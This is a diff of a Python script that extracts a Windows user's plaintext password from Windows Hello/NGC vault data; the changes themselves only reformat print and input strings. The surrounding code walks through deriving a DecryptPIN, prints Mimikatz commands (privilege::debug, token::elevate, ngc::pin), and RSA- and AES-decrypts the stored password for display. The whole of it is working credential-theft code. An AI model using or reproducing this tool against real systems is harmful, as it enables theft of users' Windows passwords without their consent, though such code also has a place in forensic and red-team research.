@@ -192,8 +192,8 @@ if __name__ == '__main__':
         print('[+] Got DecryptPIN : ' + bDecryptPin.hex().upper())
     else:
         print('[!] For TPM, you will need to know the PIN, since TPM brute forcing is limited to 32 attempts :-(')
-        print('     Mimikatz; privilege::debug, token::elevate, ngc::pin /pin:<THEPIN> /guid:' + sGUID1)
-        print('     Or use DecryptWithTPM.exe ' + sGUID1 + ' <THEPIN>')
+        print('     Mimikatz; privilege::debug, token::elevate, ngc::pin /pin:<THEPIN> /guid:{}'.format(sGUID1))
+        print('     Or use DecryptWithTPM.exe {} <THEPIN>'.format(sGUID1))
         bDecryptPin = bytes.fromhex(input('[?] Please copy paste just the "DECRYPTPIN" : '))
     
     print('-' * 50)
@@ -203,13 +203,12 @@ if __name__ == '__main__':
     oCipher = PKCS1_v1_5.new(oRSAKEY)
     print('-' * 50)
     print('[!] Final step, please run NGC vault decrypt and copy paste EncData, IV and EncPassword')
-    sEncKey =      input('[?] EncData     : ')
+    sEncKey =      input('[?] EncData       : ')
     bDecryptedKey = oCipher.decrypt(bytes.fromhex(sEncKey), b'')
     print('[+] Got AES key: {}\n'.format(bDecryptedKey.hex()))
-    sIV =          input('[?] IV          : ')
-    sEncPassword = input('[?] EncPassword : ')
+    sIV =          input('[?] IV            : ')
+    sEncPassword = input('[?] EncPassword   : ')
     from Crypto.Cipher import AES
     oCipher = AES.new(bDecryptedKey, AES.MODE_CBC, bytes.fromhex(sIV))
     bResult = oCipher.decrypt(bytes.fromhex(sEncPassword))
-    print('[+] User password : ')
-    print('  ' + bResult.decode('UTF-16LE').split('\x00')[0])
+    print('[+] User password : {}'.format(bResult.decode('UTF-16LE').split('\x00')[0]))
